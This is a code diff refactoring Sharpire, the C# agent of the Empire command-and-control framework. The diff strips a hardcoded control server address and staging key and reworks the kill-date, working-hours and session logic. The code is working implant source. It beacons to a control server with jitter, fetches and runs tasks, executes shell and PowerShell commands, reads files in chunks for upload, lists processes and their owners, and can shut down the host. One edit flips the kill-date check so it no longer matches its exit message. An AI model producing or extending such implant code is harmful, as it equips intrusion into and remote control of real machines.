@@ -1,8 +1,4 @@
-﻿// Original Author: 0xbadjuju (https://github.com/0xbadjuju/Sharpire)
-// Updated and Modified by: Jake Krasnov (@_Hubbl3)
-// Project: Empire (https://github.com/BC-SECURITY/Empire)
-
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Collections.ObjectModel;
 using System.IO;
@@ -29,10 +25,7 @@ namespace Sharpire
         public SessionInfo sessionInfo;
         private Coms coms;
         private JobTracking jobTracking;
-
-        ////////////////////////////////////////////////////////////////////////////////
-        //
-        ////////////////////////////////////////////////////////////////////////////////
+        
         public Agent(SessionInfo sessionInfo)
         {
 
@@ -40,8 +33,7 @@ namespace Sharpire
             coms = new Coms(sessionInfo);
             jobTracking = new JobTracking();
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
+        
         public void Execute()
         {
             while (true)
@@ -49,68 +41,62 @@ namespace Sharpire
                 Run();
             }
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        ////////////////////////////////////////////////////////////////////////////////
+        
         internal Coms GetComs()
         {
             return coms;
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Main Loop
-        ////////////////////////////////////////////////////////////////////////////////
+        
         private void Run()
         {
-            ////////////////////////////////////////////////////////////////////////////////
-            if (sessionInfo.GetKillDate().CompareTo(DateTime.Now) > 0 || coms.MissedCheckins > sessionInfo.GetDefaultLostLimit())
+            if (sessionInfo.GetKillDate().CompareTo(DateTime.Now) < 0 || coms.MissedCheckins > sessionInfo.GetDefaultLostLimit())
             {
                 jobTracking.CheckAgentJobs(ref packets, ref coms);
 
-                if (packets.Length > 0)
+                if (packets != null)
                 {
                     coms.SendMessage(packets);
                 }
 
-                string message = "";
+                string message;
                 if(sessionInfo.GetKillDate().CompareTo(DateTime.Now) > 0)
                 {
-                    message = "[!] Agent " + sessionInfo.GetAgentID() + " exiting: past killdate";
+                    message = "[!] Agent " + sessionInfo.GetAgentId() + " exiting: past killdate";
                 }
                 else
                 {
-                    message = "[!] Agent " + sessionInfo.GetAgentID() + " exiting: Lost limit reached";
+                    message = "[!] Agent " + sessionInfo.GetAgentId() + " exiting: Lost limit reached";
                 }
 
                 ushort result = 0;
                 coms.SendMessage(coms.EncodePacket(2, message, result));
                 Environment.Exit(1);
             }
-
-            ////////////////////////////////////////////////////////////////////////////////
             
-            if (null != sessionInfo.GetWorkingHoursStart() && null != sessionInfo.GetWorkingHoursEnd())
+            if (sessionInfo.GetWorkingHoursStart() != null && sessionInfo.GetWorkingHoursEnd() != null)
             {
                 DateTime now = DateTime.Now;
+                DateTime start = sessionInfo.GetWorkingHoursStart();
+                DateTime end = sessionInfo.GetWorkingHoursEnd();
 
-                if ((sessionInfo.GetWorkingHoursEnd() - sessionInfo.GetWorkingHoursStart()).Hours < 0)
+                if (end < start)
                 {
-                    sessionInfo.SetWorkingHoursStart(sessionInfo.GetWorkingHoursStart().AddDays(-1));
+                    end = end.AddDays(1);
                 }
 
-                if (now.CompareTo(sessionInfo.GetWorkingHoursStart()) > 0 
-                    && now.CompareTo(sessionInfo.GetWorkingHoursEnd()) < 0)
+                if (now > end)
                 {
-                    TimeSpan sleep = sessionInfo.GetWorkingHoursStart().Subtract(now);
-                    if (sleep.CompareTo(0) < 0)
-                    {
-                        sleep = (sessionInfo.GetWorkingHoursStart().AddDays(1) - now);
-                    }
+                    start = start.AddDays(1);
+                }
+
+                TimeSpan sleep = start - now;
+
+                if (sleep.TotalMilliseconds > 0)
+                {
                     Thread.Sleep((int)sleep.TotalMilliseconds);
                 }
             }
 
-            ////////////////////////////////////////////////////////////////////////////////
             if (0 != sessionInfo.GetDefaultDelay())
             {
                 int max = (int)((sessionInfo.GetDefaultJitter() + 1) * sessionInfo.GetDefaultDelay());
@@ -139,19 +125,17 @@ namespace Sharpire
                 Thread.Sleep(sleepTime * 1000);
             }
 
-            ////////////////////////////////////////////////////////////////////////////////
             byte[] jobResults = jobTracking.GetAgentJobsOutput(ref coms);
             if (0 < jobResults.Length)
             {
                 coms.SendMessage(jobResults);
             }
 
-            ////////////////////////////////////////////////////////////////////////////////
             byte[] taskData = coms.GetTask();
             if (taskData.Length > 0)
             {
                 coms.MissedCheckins = 0;
-                if (String.Empty != Encoding.UTF8.GetString(taskData))
+                if (Convert.ToBase64String(taskData) != sessionInfo.GetDefaultResponse())
                 {
                     coms.DecodeRoutingPacket(taskData, ref jobTracking);
                 }
@@ -159,13 +143,11 @@ namespace Sharpire
             GC.Collect();
         }
 
-        ////////////////////////////////////////////////////////////////////////////////
         internal static byte[] GetFilePart(string file, int index, int chunkSize)
         {
             byte[] output = new byte[0];
             try
             {
-                //Don't shoot the translator, please
                 FileInfo fileInfo = new FileInfo(file);
                 using (FileStream fileStream = File.OpenRead(file))
                 {
@@ -213,10 +195,7 @@ namespace Sharpire
                 return output;
             }
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Almost Done - Finish move copy delete
-        ////////////////////////////////////////////////////////////////////////////////
+        
         internal static string InvokeShellCommand(string command, string arguments)
         {
             if (arguments.Contains("*\"\\\\*"))
@@ -249,7 +228,6 @@ namespace Sharpire
                 }
                 else if (command == "mv" || command == "move")
                 {
-                    Console.WriteLine(arguments);
                     string[] parts = arguments.Split(' ');
                     if (2 != parts.Length)
                         return "Invalid mv|move command";
@@ -308,10 +286,7 @@ namespace Sharpire
             }
             return output;
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Working
-        ////////////////////////////////////////////////////////////////////////////////
+        
         private static void Shutdown(string flags)
         {
             ManagementClass managementClass = new ManagementClass("Win32_OperatingSystem");
@@ -320,7 +295,6 @@ namespace Sharpire
             managementClass.Scope.Options.EnablePrivileges = true;
             ManagementBaseObject managementBaseObject = managementClass.GetMethodParameters("Win32Shutdown");
 
-            // Flag 1 means we want to shut down the system. Use "2" to reboot.
             managementBaseObject["Flags"] = flags;
             managementBaseObject["Reserved"] = "0";
             foreach (ManagementObject managementObject in managementClass.GetInstances())
@@ -328,10 +302,7 @@ namespace Sharpire
                 managementObject.InvokeMethod("Win32Shutdown", managementBaseObject, null);
             }
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Working
-        ////////////////////////////////////////////////////////////////////////////////
+        
         private static string Route(string arguments)
         {
             Dictionary<uint, string> adapters = new Dictionary<uint, string>();
@@ -390,10 +361,7 @@ namespace Sharpire
             }
             return string.Join("\n", lines.ToArray());
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Working
-        ////////////////////////////////////////////////////////////////////////////////
+        
         private static string Tasklist(string arguments)
         {
             Dictionary<int, string> owners = new Dictionary<int, string>();
@@ -406,7 +374,7 @@ namespace Sharpire
             {
                 string name = "";
                 string[] owner = new string[2];
-                managementObject.InvokeMethod("GetOwner", (object[]) owner);
+                managementObject.InvokeMethod("GetOwner", owner);
                 if (owner[0] != null)
                 {
                     name = owner[1] + "\\" + owner[0];
@@ -415,7 +383,7 @@ namespace Sharpire
                 {
                     name = "N/A";
                 }
-                managementObject.InvokeMethod("GetOwner", (object[]) owner);
+                managementObject.InvokeMethod("GetOwner", owner);
                 owners[Convert.ToInt32(managementObject["Handle"])] = name;
             }
 
@@ -458,7 +426,7 @@ namespace Sharpire
                 }
 
                 lines.Add(
-                    new string[] {process.ProcessName,
+                    new[] {process.ProcessName,
                         process.Id.ToString(),
                         architecture,
                         userName,
@@ -483,10 +451,7 @@ namespace Sharpire
             }
             return string.Join("\n", sortedLines.ToArray());
         } 
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Working
-        ////////////////////////////////////////////////////////////////////////////////
+        
         private static string Ifconfig()
         {
             ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
@@ -514,9 +479,7 @@ namespace Sharpire
             }
             return string.Join("\n", lines.ToArray());
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        ////////////////////////////////////////////////////////////////////////////////
+        
         private static void DeleteFile(string sourceFile)
         {
             if (IsFile(sourceFile))
@@ -524,9 +487,7 @@ namespace Sharpire
             else
                 Directory.Delete(sourceFile, true);
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        ////////////////////////////////////////////////////////////////////////////////
+        
         private static void CopyFile(string sourceFile, string destinationFile)
         {
             if (IsFile(sourceFile))
@@ -547,9 +508,7 @@ namespace Sharpire
                 }
             }
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        ////////////////////////////////////////////////////////////////////////////////
+        
         private static void MoveFile(string sourceFile, string destinationFile)
         {
             if (IsFile(sourceFile))
@@ -557,18 +516,13 @@ namespace Sharpire
             else
                 Directory.Move(sourceFile, destinationFile);
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        ////////////////////////////////////////////////////////////////////////////////
+        
         private static bool IsFile(string filePath)
         {
             FileAttributes fileAttributes = File.GetAttributes(filePath);
             return (fileAttributes & FileAttributes.Directory) == FileAttributes.Directory ? false : true;
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Working
-        ////////////////////////////////////////////////////////////////////////////////
+        
         private static string ManagementObjectToString(string[] managementObject)
         {
             string output;
@@ -582,10 +536,7 @@ namespace Sharpire
             }
             return output;
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Working
-        ////////////////////////////////////////////////////////////////////////////////
+        
         private static string GetChildItem(string folder)
         {
             if (folder == "")
@@ -601,9 +552,6 @@ namespace Sharpire
                 foreach (FileInfo file in files)
                 {
                     lines.Add(file.ToString());
-                    //output += Directory.GetLastWriteTime(file.FullName) + "\t";
-                    //output += file.Length + "\t";
-                    //output += file.Name + "\n\r";
                 }
                 return string.Join("\n", lines.ToArray());
             }
@@ -612,10 +560,7 @@ namespace Sharpire
                 return "[!] Error: " + error + " (or cannot be accessed).";
             }
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Working
-        ////////////////////////////////////////////////////////////////////////////////
+        
         internal static string RunPowerShell(string command)
         {
             using (Runspace runspace = RunspaceFactory.CreateRunspace())
@@ -633,7 +578,7 @@ namespace Sharpire
                         Collection<PSObject> results = pipeline.Invoke();
                         foreach (PSObject obj in results)
                         {
-                            sb.Append(obj.ToString());
+                            sb.Append(obj);
                         }
                     }
                     catch (ParameterBindingException error)
@@ -679,136 +624,102 @@ namespace Sharpire
         private string SessionKey;
         private byte[] SessionKeyBytes;
 
-        public SessionInfo()
-        {
-            //These settings will be the overwritten inputs for compilation 
-            ControlServers = new String[] { "http://192.168.219.128" };
-            StagingKey = "a#)JF=z_K%7S.1,-Ou{w+j9M&bcmflI4";
-            AgentLanguage = "dotnet";
-
-            SetDefaults();
-        }
-
         public SessionInfo(string[] args)
         {
-            ControlServers = args[0].Split(new String[] { "," }, StringSplitOptions.RemoveEmptyEntries);
-            Console.WriteLine(args[1]);
+            ControlServers = args[0].Split(new[] { "," }, StringSplitOptions.RemoveEmptyEntries);
             StagingKey = args[1];
             AgentLanguage = args[2];
-
-            SetDefaults();
-        }
-
-        private void SetDefaults()
-        {
-            StagingKeyBytes = System.Text.Encoding.ASCII.GetBytes(StagingKey);
-            TaskURIs = new string[] { "/admin/get.php","/news.php","/login/process.php" };
-            UserAgent = "(Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
-            double DefaultJitter = 0.0;
-            uint DefaultDelay = 5;
-            uint DefaultLostLimit = 60;
-
+            StagingKeyBytes = Encoding.ASCII.GetBytes(StagingKey);
+            TaskURIs = new string[] {};
+            UserAgent = "";
             StagerUserAgent = "";
-            if (string.IsNullOrEmpty(StagerUserAgent))
-            {
-                StagerUserAgent = UserAgent;
-            }
             StagerURI = "";
             Proxy = "default";
             ProxyCreds = "";
-
-            string KillDate = "";
-            if (!string.IsNullOrEmpty(KillDate))
-            {
-                Regex regex = new Regex("^\\d{1,2}\\/\\d{1,2}\\/\\d{4}$");
-
-                if (regex.Match(KillDate).Success)
-                    DateTime.TryParse(KillDate, out this.KillDate);
-            }
-
-            string WorkingHours = "";
-            if (!string.IsNullOrEmpty(WorkingHours))
-            {
-                Regex regex = new Regex("^[0-9]{1,2}:[0-5][0-9]$");
-
-                string start = WorkingHours.Split(',').First();
-                if (regex.Match(start).Success)
-                    DateTime.TryParse(start, out WorkingHoursStart);
-
-                string end = WorkingHours.Split(',').Last();
-                if (regex.Match(end).Success)
-                    DateTime.TryParse(end, out WorkingHoursEnd);
-            }
         }
 
         public string[] GetControlServers() { return ControlServers; }
         public string GetStagingKey() { return StagingKey; }
         public byte[] GetStagingKeyBytes() { return StagingKeyBytes; }
-        public string GetAgentLanguage() { return AgentLanguage; }
 
-        public string[] GetTaskURIs() { return TaskURIs; }
+        public string[] GetTaskUrIs() { return TaskURIs; }
         public string GetUserAgent() { return UserAgent; }
         public double GetDefaultJitter() { return DefaultJitter; }
-        public void SetDefaultJitter(double DefaultJitter)
+        public void SetDefaultJitter(double defaultJitter)
         {
-            this.DefaultJitter = DefaultJitter;
+            DefaultJitter = defaultJitter;
         }
         public uint GetDefaultDelay() { return DefaultDelay; }
-        public void SetDefaultDelay(uint DefaultDelay)
+        public void SetDefaultDelay(uint defaultDelay)
         {
-            this.DefaultDelay = DefaultDelay;
+            DefaultDelay = defaultDelay;
         }
         public uint GetDefaultLostLimit() { return DefaultLostLimit; }
-        public void SetDefaultLostLimit(uint DefaultLostLimit)
+        public void SetDefaultLostLimit(uint defaultLostLimit)
         {
-            this.DefaultLostLimit = DefaultLostLimit;
+            this.DefaultLostLimit = defaultLostLimit;
         }
+        
+        public void SetDefaultResponse(string defaultResponse) { this.DefaultResponse = defaultResponse; }
+        public string DefaultResponse { get; set; }
+
+        public string GetDefaultResponse() { return DefaultResponse; }
 
         public string GetStagerUserAgent() { return StagerUserAgent; }
-        public string GetStagerURI() { return StagerURI; }
-        public string GetProxy() { return Proxy; }
-        public string GetProxyCreds() { return ProxyCreds; }
         public DateTime GetKillDate() { return KillDate; }
 
-        public void setProfile(string profile)
+        public void SetProfile(string profile)
         {
-            this.TaskURIs = profile.Split('|').First().Split(',');
-            this.UserAgent = profile.Split('|').Last();
+            TaskURIs = profile.Split('|').First().Split(',');
+            UserAgent = profile.Split('|').Last();
         }
-        public void SetKillDate(string KillDate)
+        
+        public void SetKillDate(string killDate)
         {
             Regex regex = new Regex("^\\d{1,2}\\/\\d{1,2}\\/\\d{4}$");
 
-            if (regex.Match(KillDate).Success)
-                DateTime.TryParse(KillDate, out this.KillDate);
+            if (string.IsNullOrWhiteSpace(killDate))
+            {
+                KillDate = DateTime.MaxValue;
+            }
+            else if (regex.Match(killDate).Success)
+            {
+                DateTime.TryParse(killDate, out KillDate);
+            }
         }
-        public void SetWorkingHoursStart(DateTime WorkingHoursStart)
-        {
-            this.WorkingHoursStart = WorkingHoursStart;
-        }
-        public void SetWorkingHours(string WorkingHours)
+
+        public void SetWorkingHours(string workingHours)
         {
             Regex regex = new Regex("^[0-9]{1,2}:[0-5][0-9]$");
 
-            string start = WorkingHours.Split('-').First();
-            if (regex.Match(start).Success)
-                DateTime.TryParse(start, out this.WorkingHoursStart);
+            if (string.IsNullOrWhiteSpace(workingHours))
+            {
+                WorkingHoursStart = DateTime.Today.AddHours(0);   // 00:00
+                WorkingHoursEnd = DateTime.Today.AddHours(23).AddMinutes(59);  // 23:59
+                return;
+            }
 
-            string end = WorkingHours.Split('-').Last();
-            if (regex.Match(end).Success)
-                DateTime.TryParse(end, out this.WorkingHoursEnd);
+            string[] times = workingHours.Split('-');
+            if (times.Length == 2)
+            {
+                string start = times[0].Trim();
+                string end = times[1].Trim();
+
+                if (regex.Match(start).Success)
+                    DateTime.TryParse(start, out WorkingHoursStart);
+
+                if (regex.Match(end).Success)
+                    DateTime.TryParse(end, out WorkingHoursEnd);
+            }
         }
+
         public DateTime GetWorkingHoursStart() { return WorkingHoursStart; }
         public DateTime GetWorkingHoursEnd() { return WorkingHoursEnd; }
 
-        public void SetAgentID(string AgentID) { this.AgentID = AgentID; }
-        public string GetAgentID() { return AgentID; }
+        public void SetAgentId(string AgentID) { this.AgentID = AgentID; }
+        public string GetAgentId() { return AgentID; }
 
-        public void SetSessionKey(string SessionKey)
-        {
-            this.SessionKey = SessionKey;
-            SessionKeyBytes = System.Text.Encoding.ASCII.GetBytes(SessionKey);
-        }
+        public byte[] SetSessionKeyBytes(byte[] sessionKeyBytes) { return this.SessionKeyBytes = sessionKeyBytes; }
         public string GetSessionKey() { return SessionKey; }
         public byte[] GetSessionKeyBytes() { return SessionKeyBytes; }
     }
